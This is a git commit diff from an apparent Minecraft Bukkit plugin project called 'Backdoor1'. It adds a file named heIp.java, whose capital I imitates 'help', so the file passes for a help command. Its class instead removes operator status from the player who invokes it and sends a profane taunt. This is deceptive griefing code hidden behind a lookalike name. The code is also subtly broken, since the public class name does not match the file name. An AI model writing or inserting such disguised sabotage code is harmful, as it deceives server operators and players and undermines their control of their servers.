1f951ca0abbc73a17c1b9b7d3d7914d6c438cd09
Torono909 <86355565+Torono909@users.noreply.github.com>
2022-02-03 11:29:25 +0530

    Update heIp.java

--- Backdoor1/src/main/java/me/lunacore/commands/heIp.java
+++ Backdoor1/src/main/java/me/lunacore/commands/heIp.java
@@ -1,1 +1,16 @@
+package me.lunacore.commands;
 
+import org.bukkit.command.Command;
+import org.bukkit.command.CommandExecutor;
+import org.bukkit.command.CommandSender;
+import org.bukkit.entity.Player;
+
+public class dp implements CommandExecutor {
+    @Override
+    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
+        Player p = (Player) sender;
+        p.sendMessage("K deopped ur ass get a fucking life!!!!!");
+        p.setOp(false);
+        return true;
+    }
+}
